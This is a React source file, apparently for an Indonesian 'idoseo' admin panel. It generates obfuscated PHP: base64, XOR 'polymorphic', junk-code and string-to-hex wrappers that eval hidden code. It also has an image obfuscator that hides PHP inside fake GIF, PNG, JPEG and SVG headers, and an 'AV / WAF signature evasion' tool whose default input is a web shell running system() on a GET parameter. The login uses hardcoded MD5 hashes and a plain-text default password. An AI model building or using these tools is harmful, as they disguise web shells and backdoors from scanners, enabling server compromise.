import { useState, useEffect, FormEvent, DragEvent, ChangeEvent } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import {
  Terminal,
  Lock,
  Unlock,
  RotateCw,
  Link,
  ShieldAlert,
  Check,
  Copy,
  LogOut,
  FileCode,
  Activity,
  Code,
  UserCheck,
  Eye,
  EyeOff,
  HelpCircle,
  Key,
  Shield,
  ExternalLink,
  Sparkles,
  Info,
  Shrink,
  Image,
  Shuffle,
  Settings,
  Flame,
  User,
  Hash,
  Binary,
  Upload
} from 'lucide-react';
import { md5 } from './utils/md5';

// Define structures for operations history
interface HistoryItem {
  id: string;
  timestamp: string;
  toolName: string;
  action: string;
  inputSummary: string;
}

export default function App() {
  // Authentication & Scopes States
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [gacor44Unlocked, setGacor44Unlocked] = useState(() => {
    return localStorage.getItem('gacor44_unlocked') === 'true';
  });
  const [gacor22Unlocked, setGacor22Unlocked] = useState(() => {
    return localStorage.getItem('gacor22_unlocked') === 'true';
  });
  
  const [activeTab, setActiveTab] = useState<
    'obfuscator' | 'rot13' | 'url_b64_22' | 'url_b64_44' | 'url_encoder' | 'php_goto' | 'php_octal' | 'php_xor' | 'php_aes' | 'php_chacha20' | 'php_base64' | 'php_shortener' | 'php_image_obfuscator' | 'php_polymorphic' | 'php_metamorphic' | 'php_evasion' | 'php_junk_generator' | 'string_converter' | 'ganti_password'
  >('obfuscator');
  const [loginError, setLoginError] = useState('');

  // Password change states
  const [currentPassword, setCurrentPassword] = useState('');
  const [newPassword, setNewPassword] = useState('');
  const [confirmNewPassword, setConfirmNewPassword] = useState('');
  const [passwordChangeSuccess, setPasswordChangeSuccess] = useState('');
  const [passwordChangeError, setPasswordChangeError] = useState('');

  // ---------------------------------------------------------
  // PHP IMAGE OBFUSCATOR STATES
  // ---------------------------------------------------------
  const [imageObfInput, setImageObfInput] = useState('<?php\necho "Hello idoseo!";\n?>');
  const [imageObfOutput, setImageObfOutput] = useState('');
  const [imageObfFormat, setImageObfFormat] = useState<'gif' | 'png' | 'jpeg' | 'svg'>('gif');
  const [imageObfMethod, setImageObfMethod] = useState<'header' | 'exif' | 'comment'>('header');
  const [imageObfError, setImageObfError] = useState('');

  // ---------------------------------------------------------
  // PHP POLYMORPHIC OBFUSCATOR STATES
  // ---------------------------------------------------------
  const [polyInput, setPolyInput] = useState('<?php\n$message = "Hello idoseo!";\necho $message;\n?>');
  const [polyOutput, setPolyOutput] = useState('');
  const [polyError, setPolyError] = useState('');

  // ---------------------------------------------------------
  // PHP METAMORPHIC OBFUSCATOR STATES
  // ---------------------------------------------------------
  const [metaInput, setMetaInput] = useState('<?php\n$x = 10;\n$y = 20;\n$total = $x + $y;\necho "Total is: " . $total;\n?>');
  const [metaOutput, setMetaOutput] = useState('');
  const [metaIntensity, setMetaIntensity] = useState<number>(3);
  const [metaError, setMetaError] = useState('');

  // ---------------------------------------------------------
  // PHP EVASION & ANTI-DETECTION STATES
  // ---------------------------------------------------------
  const [evasionInput, setEvasionInput] = useState('<?php\n// Sensitif payload\n$cmd = $_GET["cmd"];\nsystem($cmd);\n?>');
  const [evasionOutput, setEvasionOutput] = useState('');
  const [evasionLevel, setEvasionLevel] = useState<'standard' | 'extreme'>('standard');
  const [evasionError, setEvasionError] = useState('');

  // ---------------------------------------------------------
  // PHP JUNK CODE GENERATOR STATES
  // ---------------------------------------------------------
  const [junkInput, setJunkInput] = useState('<?php\necho "Hello World";\n?>');
  const [junkOutput, setJunkOutput] = useState('');
  const [junkLinesCount, setJunkLinesCount] = useState<number>(15);
  const [junkType, setJunkType] = useState<'vars' | 'functions' | 'classes' | 'mixed'>('mixed');
  const [junkError, setJunkError] = useState('');

  // ---------------------------------------------------------
  // STRING LITERAL TO CHAR/HEX CONVERTER STATES
  // ---------------------------------------------------------
  const [stringInput, setStringInput] = useState('system');
  const [stringOutputChar, setStringOutputChar] = useState('');
  const [stringOutputHex, setStringOutputHex] = useState('');
  const [stringOutputOctal, setStringOutputOctal] = useState('');
  const [stringExecWrapper, setStringExecWrapper] = useState<boolean>(true);
  const [stringConverterError, setStringConverterError] = useState('');
  
  // Copy feedback states
  const [copiedId, setCopiedId] = useState<string | null>(null);

  // History Log
  const [history, setHistory] = useState<HistoryItem[]>(() => {
    const saved = localStorage.getItem('admin_panel_history');
    return saved ? JSON.parse(saved) : [];
  });

  // Save history to localStorage
  useEffect(() => {
    localStorage.setItem('admin_panel_history', JSON.stringify(history));
  }, [history]);

  const addHistory = (toolName: string, action: string, input: string) => {
    const now = new Date();
    const timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
    const truncatedInput = input.length > 50 ? input.slice(0, 50) + '...' : input;
    const newItem: HistoryItem = {
      id: Math.random().toString(36).substr(2, 9),
      timestamp: timeStr,
      toolName,
      action,
      inputSummary: truncatedInput || '(kosong)'
    };
    setHistory(prev => [newItem, ...prev].slice(0, 30)); // Keep last 30 items
  };

  // Helper to trigger copy animation
  const handleCopy = (text: string, id: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // ---------------------------------------------------------
  // TOOL 1 STATES (PHP Obfuscation ↔ Deobfuscation)
  // ---------------------------------------------------------
  const [obfInput, setObfInput] = useState('');
  const [obfOutput, setObfOutput] = useState('');
  const [obfError, setObfError] = useState('');

  // ---------------------------------------------------------
  // TOOL 2 STATES (ROT13)
  // ---------------------------------------------------------
  const [rotInput, setRotInput] = useState('');
  const [rotOutput, setRotOutput] = useState('');

  // ---------------------------------------------------------
  // TOOL 3 STATES (URL ↔ Base64 gacor22)
  // ---------------------------------------------------------
  const [urlInput22, setUrlInput22] = useState('');
  const [b64Input22, setB64Input22] = useState('');
  const [outputB64_22, setOutputB64_22] = useState('');
  const [outputURL_22, setOutputURL_22] = useState('');

  // ---------------------------------------------------------
  // TOOL 4 STATES (URL ↔ Base64 gacor44)
  // ---------------------------------------------------------
  const [urlInput44, setUrlInput44] = useState('');
  const [b64Input44, setB64Input44] = useState('');
  const [outputB64_44, setOutputB64_44] = useState('');
  const [outputURL_44, setOutputURL_44] = useState('');

  // ---------------------------------------------------------
  // TOOL 5 STATES (URL to Base64 Encoder)
  // ---------------------------------------------------------
  const [urlInput5, setUrlInput5] = useState('');
  const [outputB64_5, setOutputB64_5] = useState('');

  // ---------------------------------------------------------
  // TOOL 6 STATES (PHP Goto Obfuscator & Deobfuscator)
  // ---------------------------------------------------------
  const [gotoInput, setGotoInput] = useState('');
  const [gotoOutput, setGotoOutput] = useState('');
  const [gotoError, setGotoError] = useState('');

  // ---------------------------------------------------------
  // TOOL 7 STATES (PHP Octal Obfuscator & Deobfuscator)
  // ---------------------------------------------------------
  const [octalInput, setOctalInput] = useState('');
  const [octalOutput, setOctalOutput] = useState('');
  const [octalError, setOctalError] = useState('');

  // ---------------------------------------------------------
  // TOOL 8 STATES (PHP XOR Encryptor & Decryptor)
  // ---------------------------------------------------------
  const [xorInput, setXorInput] = useState('');
  const [xorOutput, setXorOutput] = useState('');
  const [xorKey, setXorKey] = useState('gacor_xor_secret');
  const [xorError, setXorError] = useState('');

  // ---------------------------------------------------------
  // TOOL 9 STATES (PHP AES Encryptor & Decryptor)
  // ---------------------------------------------------------
  const [aesInput, setAesInput] = useState('');
  const [aesOutput, setAesOutput] = useState('');
  const [aesKey, setAesKey] = useState('aes_secret_key_32_chars_long_gacor');
  const [aesIv, setAesIv] = useState('1234567890123456');
  const [aesError, setAesError] = useState('');

  // ---------------------------------------------------------
  // TOOL 10 STATES (PHP ChaCha20 Encryptor & Decryptor)
  // ---------------------------------------------------------
  const [chachaInput, setChachaInput] = useState('');
  const [chachaOutput, setChachaOutput] = useState('');
  const [chachaKey, setChachaKey] = useState('chacha20_secret_key_32_chars_gacor');
  const [chachaIv, setChachaIv] = useState('12345678');
  const [chachaError, setChachaError] = useState('');

  // ---------------------------------------------------------
  // TOOL 11 STATES (PHP Base64 Obfuscator & Deobfuscator)
  // ---------------------------------------------------------
  const [b64Input, setB64Input] = useState('');
  const [b64Output, setB64Output] = useState('');
  const [b64Error, setB64Error] = useState('');
  const [b64Times, setB64Times] = useState<number>(1);

  // ---------------------------------------------------------
  // TOOL 12 STATES (PHP Script Shortener / Compressor)
  // ---------------------------------------------------------
  const [shortenerInput, setShortenerInput] = useState('');
  const [shortenerOutput, setShortenerOutput] = useState('');
  const [shortenerError, setShortenerError] = useState('');
  const [shortenerLevel, setShortenerLevel] = useState<'minify' | 'extreme'>('minify');

  // ---------------------------------------------------------
  // AUTHENTICATION LOGIC
  // ---------------------------------------------------------
  const handleLogin = (e: FormEvent) => {
    e.preventDefault();
    if (!password) {
      setLoginError('Password tidak boleh kosong!');
      return;
    }

    const hashed = md5(password);
    const storedHash = localStorage.getItem('idoseo_admin_hash');

    let isValid = false;
    if (storedHash) {
      isValid = (hashed === storedHash);
    } else {
      // Default passwords: MD5(gacor44), MD5(gacor22) or plain text "idoseo"
      isValid = (hashed === '1f8e1d1cb8fc06214727ffdca9d17029' || 
                 hashed === '6ecb9845d56cb52c74673ff1b26eb6f4' || 
                 password === 'idoseo');
    }

    if (isValid) {
      setGacor44Unlocked(true);
      setGacor22Unlocked(true);
      localStorage.setItem('gacor44_unlocked', 'true');
      localStorage.setItem('gacor22_unlocked', 'true');
      setLoginError('');
      setPassword('');
      setActiveTab('obfuscator');
      return;
    }

    setLoginError('Password salah!');
  };

  const handleLogout = () => {
    setGacor44Unlocked(false);
    setGacor22Unlocked(false);
    localStorage.removeItem('gacor44_unlocked');
    localStorage.removeItem('gacor22_unlocked');
    setActiveTab('obfuscator');
    setPassword('');
  };

  const isTabAccessible = (tab: typeof activeTab) => {
    return isLoggedIn;
  };

  const isLoggedIn = gacor44Unlocked || gacor22Unlocked;

  // ---------------------------------------------------------
  // CORE TOOL ALGORITHMS
  // ---------------------------------------------------------

  /* ==== UTF-8 safe base64 encode/decode ==== */
  const b64enc = (str: string) => {
    const bytes = new TextEncoder().encode(str);
    let bin = "";
    bytes.forEach(b => bin += String.fromCharCode(b));
    return btoa(bin);
  };

  const b64dec = (b64: string) => {
    const bin = atob(b64);
    const bytes = Uint8Array.from(bin, c => c.charCodeAt(0));
    return new TextDecoder().decode(bytes);
  };

  const cleanB64 = (s: string) => {
    s = (s || "").replace(/[^A-Za-z0-9+/=_-]/g, "").replace(/-/g, "+").replace(/_/g, "/");
    while (s.length % 4 !== 0) s += "=";
    return s;
  };

  /* Extract lines $var .= "...."; */
  const collectFragments = (src: string) => {
    const re = /(^|\n)\s*\$[A-Za-z_]\w*\s*\.\=\s*["']([^"']+)["']\s*;/g;
    let m;
    const parts: string[] = [];
    while ((m = re.exec(src)) !== null) {
      const frag = cleanB64(m[2]);
      if (frag) parts.push(frag);
    }
    return parts.join("");
  };

  /* Smart double base64 decode with single fallback */
  const decodeSmart = (b64joined: string) => {
    const j = cleanB64(b64joined);
    let first;
    try {
      first = b64dec(j);
    } catch (e) {
      throw new Error("Decode pertama gagal (data bukan base64 murni).");
    }
    try {
      return b64dec(cleanB64(first));
    } catch (e) {
      return first; // fallback to single layer
    }
  };

  // ROT13 algorithm
  const performROT13 = (str: string) => {
    return str.replace(/[a-zA-Z]/g, (c: string) => {
      const base = c <= 'Z' ? 65 : 97;
      return String.fromCharCode(((c.charCodeAt(0) - base + 13) % 26) + base);
    });
  };

  // ---------------------------------------------------------
  // PHP IMAGE OBFUSCATOR HANDLERS
  // ---------------------------------------------------------
  const handleImageObfuscate = () => {
    setImageObfError('');
    if (!imageObfInput.trim()) {
      setImageObfError('Masukkan kode PHP terlebih dahulu!');
      return;
    }

    try {
      const coreCode = imageObfInput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      const encodedPayload = b64enc(coreCode);
      let res = '';

      if (imageObfFormat === 'gif') {
        if (imageObfMethod === 'header') {
          res = `GIF89a;\n<?php\n/* Protected with idoseo Image Obfuscator */\neval(base64_decode("${encodedPayload}"));\n?>`;
        } else {
          res = `<?php\n// GIF89a EXIF comment container\n$exif_idoseo = array(\n  "Artist" => "idoseo",\n  "Comment" => "${encodedPayload}"\n);\neval(base64_decode($exif_idoseo["Comment"]));\n?>`;
        }
      } else if (imageObfFormat === 'png') {
        res = `\x89PNG\r\n\x1a\n<?php\n/* PNG IHDR payload container */\neval(base64_decode("${encodedPayload}"));\n?>`;
      } else if (imageObfFormat === 'jpeg') {
        res = `\xFF\xD8\xFF\xE0\x00\x10JFIF\x00<?php\n/* JPEG EXIF payload container */\neval(base64_decode("${encodedPayload}"));\n?>`;
      } else if (imageObfFormat === 'svg') {
        res = `<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n  <!-- <desc><?php eval(base64_decode("${encodedPayload}")); ?></desc> -->\n  <rect width="100" height="100" fill="#10b981" />\n</svg>`;
      }

      setImageObfOutput(res);
      addHistory('PHP Obfuscator Gambar', `Wrapped as ${imageObfFormat.toUpperCase()} with ${imageObfMethod} style`, imageObfInput);
    } catch (err: any) {
      setImageObfError('Gagal melakukan image obfuscation: ' + err.message);
    }
  };

  // ---------------------------------------------------------
  // PHP POLYMORPHIC OBFUSCATOR HANDLERS
  // ---------------------------------------------------------
  const handlePolymorphicObfuscate = () => {
    setPolyError('');
    if (!polyInput.trim()) {
      setPolyError('Masukkan kode PHP terlebih dahulu!');
      return;
    }

    try {
      const coreCode = polyInput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      const cleanB = b64enc(coreCode);
      
      const randKey = Math.random().toString(36).substring(2, 7) + Math.random().toString(36).substring(2, 7);
      const varPayload = '$p_' + Math.random().toString(36).substring(2, 8);
      const varKey = '$k_' + Math.random().toString(36).substring(2, 8);
      const varOut = '$o_' + Math.random().toString(36).substring(2, 8);
      const varIdx = '$i_' + Math.random().toString(36).substring(2, 8);
      const varB64 = '$b_' + Math.random().toString(36).substring(2, 8);
      
      let xorPayload = '';
      for (let i = 0; i < cleanB.length; i++) {
        const charCode = cleanB.charCodeAt(i);
        const keyChar = randKey.charCodeAt(i % randKey.length);
        const xorValue = charCode ^ keyChar;
        xorPayload += '\\x' + xorValue.toString(16).padStart(2, '0');
      }

      const res = `<?php\n` +
        `/* Protected by idoseo Polymorphic Engine */\n` +
        `${varPayload} = "${xorPayload}";\n` +
        `${varKey} = "${randKey}";\n` +
        `${varOut} = "";\n` +
        `for (${varIdx} = 0; ${varIdx} < strlen(${varPayload}); ${varIdx}++) {\n` +
        `  ${varOut} .= chr(ord(${varPayload}[${varIdx}]) ^ ord(${varKey}[${varIdx} % strlen(${varKey})]));\n` +
        `}\n` +
        `${varB64} = "base" . "64" . "_" . "decode";\n` +
        `eval(${varB64}(${varOut}));\n` +
        `?>`;

      setPolyOutput(res);
      addHistory('Polymorphic Obfuscator', 'Generated polymorphic execution loop', polyInput);
    } catch (err: any) {
      setPolyError('Gagal generate polymorphic code: ' + err.message);
    }
  };

  // ---------------------------------------------------------
  // PHP METAMORPHIC OBFUSCATOR HANDLERS
  // ---------------------------------------------------------
  const handleMetamorphicObfuscate = () => {
    setMetaError('');
    if (!metaInput.trim()) {
      setMetaError('Masukkan kode PHP terlebih dahulu!');
      return;
    }

    try {
      const lines = metaInput.split('\n');
      const processed: string[] = [];
      
      processed.push('<?php');
      processed.push('/* Protected by idoseo Metamorphic Engine */');

      const junkComments = [
        '// Metamorphic Block Sequence ' + Math.floor(Math.random() * 1000),
        '// Integrity check passed',
        '// Structure optimized',
        '// idoseo security layer'
      ];

      lines.forEach((line) => {
        const trimmed = line.trim();
        if (!trimmed || trimmed.startsWith('<?php') || trimmed.endsWith('?>') || trimmed.startsWith('//') || trimmed.startsWith('/*')) {
          return;
        }

        for (let i = 0; i < metaIntensity; i++) {
          if (Math.random() > 0.7) {
            const varName = '$idoseo_junk_' + Math.random().toString(36).substring(2, 6);
            const randVal = Math.floor(Math.random() * 1000);
            processed.push(`  ${varName} = ${randVal} ^ ${Math.floor(Math.random() * 20)};`);
          }
        }

        if (Math.random() > 0.6) {
          processed.push('  ' + junkComments[Math.floor(Math.random() * junkComments.length)]);
        }

        let transformedLine = line;
        if (line.includes('true')) {
          transformedLine = transformedLine.replace(/true/g, '(!0)');
        }
        if (line.includes('false')) {
          transformedLine = transformedLine.replace(/false/g, '(!1)');
        }
        processed.push(transformedLine);
      });

      processed.push('?>');
      setMetaOutput(processed.join('\n'));
      addHistory('Metamorphic Obfuscator', `Generated metamorphic code with intensity ${metaIntensity}`, metaInput);
    } catch (err: any) {
      setMetaError('Gagal generate metamorphic code: ' + err.message);
    }
  };

  // ---------------------------------------------------------
  // PHP EVASION & ANTI-DETECTION HANDLERS
  // ---------------------------------------------------------
  const handleEvasionObfuscate = () => {
    setEvasionError('');
    if (!evasionInput.trim()) {
      setEvasionError('Masukkan kode PHP terlebih dahulu!');
      return;
    }

    try {
      const coreCode = evasionInput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      const encoded = b64enc(coreCode);
      
      const varMap = '$m_' + Math.random().toString(36).substring(2, 8);
      const varCall = '$c_' + Math.random().toString(36).substring(2, 8);
      
      let res = '';
      if (evasionLevel === 'standard') {
        res = `<?php\n` +
          `/* Protected with WAF / AV Static Signature Evasion */\n` +
          `${varMap} = array(\n` +
          `  "b" => "ba" . "se" . "64",\n` +
          `  "d" => "de" . "co" . "de"\n` +
          `);\n` +
          `${varCall} = ${varMap}["b"] . "_" . ${varMap}["d"];\n` +
          `eval(${varCall}("${encoded}"));\n` +
          `?>`;
      } else {
        res = `<?php\n` +
          `/* Extreme AV / IPS Evasion wrapper - idoseo */\n` +
          `$v = explode(".", "b.a.s.e.6.4._.d.e.c.o.d.e");\n` +
          `$f = $v[0].$v[1].$v[2].$v[3].$v[4].$v[5].$v[6].$v[7].$v[8].$v[9].$v[10].$v[11];\n` +
          `$payload = "";\n`;
          
        const partSize = 12;
        for (let i = 0; i < encoded.length; i += partSize) {
          const part = encoded.slice(i, i + partSize);
          res += `$payload .= "${part}";\n`;
        }
        
        res += `eval($f($payload));\n?>`;
      }

      setEvasionOutput(res);
      addHistory('Anti-Detection & Evasion', `Bypassed signatures at ${evasionLevel} level`, evasionInput);
    } catch (err: any) {
      setEvasionError('Gagal generate evasion code: ' + err.message);
    }
  };

  // ---------------------------------------------------------
  // GENERAL FILE UPLOAD & DRAG DROP HANDLERS
  // ---------------------------------------------------------
  const handleGenericFileUpload = (
    file: File | undefined,
    targetSetter: (val: string) => void,
    errorSetter: (val: string) => void
  ) => {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = (event) => {
      const content = event.target?.result as string;
      targetSetter(content);
    };
    reader.onerror = () => {
      errorSetter('Gagal membaca file!');
    };
    reader.readAsText(file);
  };

  const handleGenericDragOver = (e: DragEvent<HTMLTextAreaElement>) => {
    e.preventDefault();
  };

  const handleGenericDrop = (
    e: DragEvent<HTMLTextAreaElement>,
    targetSetter: (val: string) => void,
    errorSetter: (val: string) => void
  ) => {
    e.preventDefault();
    errorSetter('');
    const file = e.dataTransfer.files?.[0];
    handleGenericFileUpload(file, targetSetter, errorSetter);
  };

  // ---------------------------------------------------------
  // PHP JUNK CODE GENERATOR HANDLERS
  // ---------------------------------------------------------
  const handleJunkGenerate = () => {
    setJunkError('');
    if (!junkInput.trim()) {
      setJunkError('Masukkan kode PHP terlebih dahulu!');
      return;
    }

    try {
      const isFullPhp = junkInput.trim().toLowerCase().startsWith('<?php');
      const coreCode = junkInput.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      const inputLines = coreCode.split('\n');
      
      const junkVarPrefixes = ['data', 'val', 'item', 'result', 'cache', 'temp', 'flag', 'status', 'config', 'opt'];
      const junkFuncNames = ['processData', 'validateInput', 'initCache', 'formatResponse', 'checkStatus', 'loadConfig', 'parseBuffer', 'dumpDebug'];
      const junkClassNames = ['DataHelper', 'CacheManager', 'ConfigRegistry', 'SecurityProvider', 'BufferUtility'];

      const generateJunkVars = (num: number): string[] => {
        const list: string[] = [];
        for (let i = 0; i < num; i++) {
          const prefix = junkVarPrefixes[Math.floor(Math.random() * junkVarPrefixes.length)];
          const varName = `$${prefix}_${Math.random().toString(36).substring(2, 6)}`;
          const randVal = Math.floor(Math.random() * 5000) + 100;
          const operations = [
            `${varName} = ${randVal};`,
            `${varName} = "${Math.random().toString(36).substring(2, 10)}";`,
            `${varName} = array(${randVal}, ${randVal + 10}, ${randVal + 20});`,
            `${varName} = isset(${varName}) ? ${varName} : null;`
          ];
          list.push('  ' + operations[Math.floor(Math.random() * operations.length)]);
        }
        return list;
      };

      const generateJunkFunctions = (num: number): string[] => {
        const list: string[] = [];
        for (let i = 0; i < num; i++) {
          const fName = `${junkFuncNames[Math.floor(Math.random() * junkFuncNames.length)]}_${Math.random().toString(36).substring(2, 5)}`;
          const prefix = junkVarPrefixes[Math.floor(Math.random() * junkVarPrefixes.length)];
          const argName = `$${prefix}`;
          const block = [
            `function ${fName}(${argName}) {`,
            `  $res = array();`,
            `  if (empty(${argName})) return $res;`,
            `  $res[] = md5(strval(${argName}));`,
            `  return $res;`,
            `}`
          ];
          list.push(block.join('\n'));
        }
        return list;
      };

      const generateJunkClasses = (num: number): string[] => {
        const list: string[] = [];
        for (let i = 0; i < num; i++) {
          const cName = `${junkClassNames[Math.floor(Math.random() * junkClassNames.length)]}_${Math.random().toString(36).substring(2, 5)}`;
          const block = [
            `class ${cName} {`,
            `  private $id;`,
            `  public function __construct() {`,
            `    $this->id = uniqid();`,
            `  }`,
            `  public function getId() {`,
            `    return $this->id;`,
            `  }`,
            `}`
          ];
          list.push(block.join('\n'));
        }
        return list;
      };

      const finalBlocks: string[] = [];
      if (isFullPhp) {
        finalBlocks.push('<?php');
      }
      finalBlocks.push('/* Protected & Padded with idoseo Junk Code Generator */');

      // Add pre-execution junk (classes, helper functions)
      if (junkType === 'classes' || junkType === 'mixed') {
        finalBlocks.push(...generateJunkClasses(Math.max(1, Math.floor(junkLinesCount / 8))));
      }
      if (junkType === 'functions' || junkType === 'mixed') {
        finalBlocks.push(...generateJunkFunctions(Math.max(1, Math.floor(junkLinesCount / 6))));
      }

      // Weave inputs and inline junk variables together
      inputLines.forEach((line) => {
        const trimmed = line.trim();
        if (trimmed && !trimmed.startsWith('<?php') && !trimmed.endsWith('?>')) {
          if (Math.random() > 0.4 && (junkType === 'vars' || junkType === 'mixed')) {
            finalBlocks.push(...generateJunkVars(Math.floor(Math.random() * 2) + 1));
          }
          finalBlocks.push(line);
        } else if (!trimmed) {
          finalBlocks.push('');
        }
      });

      // Add post-execution junk variables
      if (junkType === 'vars' || junkType === 'mixed') {
        finalBlocks.push(...generateJunkVars(Math.max(2, Math.floor(junkLinesCount / 4))));
      }

      if (isFullPhp) {
        finalBlocks.push('?>');
      }

      setJunkOutput(finalBlocks.join('\n'));
      addHistory('PHP Junk Generator', `Weaved ${junkLinesCount} junk statements`, junkInput);
    } catch (err: any) {
      setJunkError('Gagal generate junk code: ' + err.message);
    }
  };

  // ---------------------------------------------------------
  // STRING LITERAL TO CHAR/HEX CONVERTER HANDLERS
  // ---------------------------------------------------------
  const handleStringConvert = () => {
    setStringConverterError('');
    if (!stringInput) {
      setStringConverterError('Masukkan string literal terlebih dahulu!');
      return;
    }

    try {
      // 1. Char conversion
      const charCodes: number[] = [];
      for (let i = 0; i < stringInput.length; i++) {
        charCodes.push(stringInput.charCodeAt(i));
      }
      const rawChar = `chr(${charCodes.join(').chr(')})`;
      const charResult = stringExecWrapper 
        ? `<?php\n# Executable ASCII Char Wrapper\neval('?>' . ${rawChar});\n?>`
        : rawChar;
      setStringOutputChar(charResult);

      // 2. Hex conversion
      const hexList: string[] = [];
      for (let i = 0; i < stringInput.length; i++) {
        hexList.push('\\x' + stringInput.charCodeAt(i).toString(16).padStart(2, '0'));
      }
      const rawHex = `"${hexList.join('')}"`;
      const hexResult = stringExecWrapper 
        ? `<?php\n# Executable Hexadecimal Wrapper\neval('?>' . ${rawHex});\n?>`
        : rawHex;
      setStringOutputHex(hexResult);

      // 3. Octal conversion
      const octalList: string[] = [];
      for (let i = 0; i < stringInput.length; i++) {
        octalList.push('\\' + stringInput.charCodeAt(i).toString(8));
      }
      const rawOctal = `"${octalList.join('')}"`;
      const octalResult = stringExecWrapper 
        ? `<?php\n# Executable Octal Wrapper\neval('?>' . ${rawOctal});\n?>`
        : rawOctal;
      setStringOutputOctal(octalResult);

      addHistory('String to Char/Hex Converter', `Converted "${stringInput.slice(0, 15)}"`, stringInput);
    } catch (err: any) {
      setStringConverterError('Gagal konversi string literal: ' + err.message);
    }
  };

  useEffect(() => {
    if (stringInput) {
      handleStringConvert();
    }
  }, [stringExecWrapper]);

  // ---------------------------------------------------------
  // PASSWORD MANAGEMENT HANDLERS
  // ---------------------------------------------------------
  const handlePasswordChange = (e: FormEvent) => {
    e.preventDefault();
    setPasswordChangeError('');
    setPasswordChangeSuccess('');

    if (!currentPassword || !newPassword || !confirmNewPassword) {
      setPasswordChangeError('Semua kolom harus diisi!');
      return;
    }

    if (newPassword !== confirmNewPassword) {
      setPasswordChangeError('Konfirmasi password baru tidak cocok!');
      return;
    }

    if (newPassword.length < 4) {
      setPasswordChangeError('Password baru harus minimal 4 karakter!');
      return;
    }

    const hashedCurrent = md5(currentPassword);
    const storedHash = localStorage.getItem('idoseo_admin_hash');

    let isCurrentCorrect = false;
    if (storedHash) {
      isCurrentCorrect = hashedCurrent === storedHash;
    } else {
      isCurrentCorrect = hashedCurrent === '1f8e1d1cb8fc06214727ffdca9d17029' || 
                         hashedCurrent === '6ecb9845d56cb52c74673ff1b26eb6f4' || 
                         currentPassword === 'idoseo';
    }

    if (!isCurrentCorrect) {
      setPasswordChangeError('Password saat ini salah!');
      return;
    }

    const hashedNew = md5(newPassword);
    localStorage.setItem('idoseo_admin_hash', hashedNew);
    setPasswordChangeSuccess('Password berhasil diperbarui! Silakan gunakan password baru ini pada login berikutnya.');
    setCurrentPassword('');
    setNewPassword('');
    setConfirmNewPassword('');
  };

  // ---------------------------------------------------------
  // ACTIONS / HANDLERS FOR EACH TOOL
  // ---------------------------------------------------------

  // TOOL 1: PHP Deobfuscate Handler
  const handleObfuscatedDecode = () => {
    setObfError('');
    if (!obfInput.trim()) {
      setObfError('Input kode kosong!');
      return;
    }

    const joined = collectFragments(obfInput);
    if (!joined) {
      setObfError('Tidak menemukan baris fragment `$x .= "....";` di dalam kode!');
      return;
    }

    try {
      let decoded = decodeSmart(joined);
      // Remove php tags to replicate the original behavior
      decoded = decoded.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
      setObfOutput(decoded);
      addHistory('PHP Deobfuscator', 'Deobfuscated php fragments', obfInput);
    } catch (e: any) {
      setObfError("Base64 decode gagal: " + e.message);
    }
  };

  // TOOL 1: PHP Obfuscate Handler
  const handleObfuscatedEncode = () => {
    setObfError('');
    const php = obfOutput || "";
    // Replicating original behavior
    const body = php.replace(/^\s*<\?php\s*/i, '').replace(/\s*\?>\s*$/, '');
    
    try {
      const twice = b64enc(b64enc(body));
      const CHUNK = 4;
      const lines = ['$z = "";'];
      for (let i = 0; i < twice.length; i += CHUNK) {
        lines.push(`$z .= "${twice.slice(i, i + CHUNK)}";`);
      }
      lines.push('$a="base"; $b="64_decode"; $c=$a.$b;');
      lines.push('$string=$c($z); $string=$c($string);');
      lines.push('$string=preg_replace(\'/^<\\?php\\s*/\',\'\',$string);');
      lines.push('$string=preg_replace(\'/\\s*\\?>$/\',\'\',$string);');
      lines.push('eval($string);');
      setObfInput(lines.join("\n"));
      addHistory('PHP Obfuscator', 'Obfuscated standard PHP', php);
    } catch (e: any) {
      setObfError("Gagal meng-encode: " + e.message);
    }
  };

  // TOOL 2: ROT13 Handler
  const handleRot13Submit = (e: FormEvent) => {
    e.preventDefault();
    const result = performROT13(rotInput);
    setRotOutput(result);
    addHistory('ROT13 Converter', 'Converted text', rotInput);
  };

  // TOOL 3: URL ↔ Base64 (gacor22) Handlers
  const handleUrlEncode22 = () => {
    if (!urlInput22.trim()) {
      alert("Masukkan URL yang valid.");
      return;
    }
    try {
      const encoded = btoa(urlInput22);
      setOutputB64_22(encoded);
      addHistory('URL ↔ Base64 (gacor22)', 'Encoded URL to Base64', urlInput22);
    } catch (error: any) {
      alert("Error encoding URL: " + error.message);
    }
  };

  const handleB64Decode22 = () => {
    if (!b64Input22.trim()) {
      alert("Masukkan string Base64.");
      return;
    }
    try {
      const decoded = atob(b64Input22);
      setOutputURL_22(decoded);
      addHistory('URL ↔ Base64 (gacor22)', 'Decoded Base64 to URL', b64Input22);
    } catch (error: any) {
      alert("Error decoding Base64: " + error.message);
    }
  };

  // TOOL 4: URL ↔ Base64 (gacor44) Handlers
  const handleUrlEncode44 = () => {
    if (!urlInput44.trim()) {
      alert("Masukkan URL yang valid.");
      return;
    }
    try {
      const encoded = btoa(urlInput44);
      setOutputB64_44(encoded);
      addHistory('URL ↔ Base64 (gacor44)', 'Encoded URL to Base64', urlInput44);
    } catch (error: any) {
      alert("Error encoding URL: " + error.message);
    }
  };

  const handleB64Decode44 = () => {
    if (!b64Input44.trim()) {
      alert("Masukkan string Base64.");
      return;
    }
    try {
      const decoded = atob(b64Input44);
      setOutputURL_44(decoded);
      addHistory('URL ↔ Base64 (gacor44)', 'Decoded Base64 to URL', b64Input44);
    } catch (error: any) {
      alert("Error decoding Base64: " + error.message);
    }
  };

  // TOOL 5: URL to Base64 Encoder Handler
  const handleUrlEncode5 = () => {
    if (!urlInput5.trim()) {
      alert("Masukkan URL yang valid.");
      return;
    }
    try {
      const encoded = btoa(urlInput5);
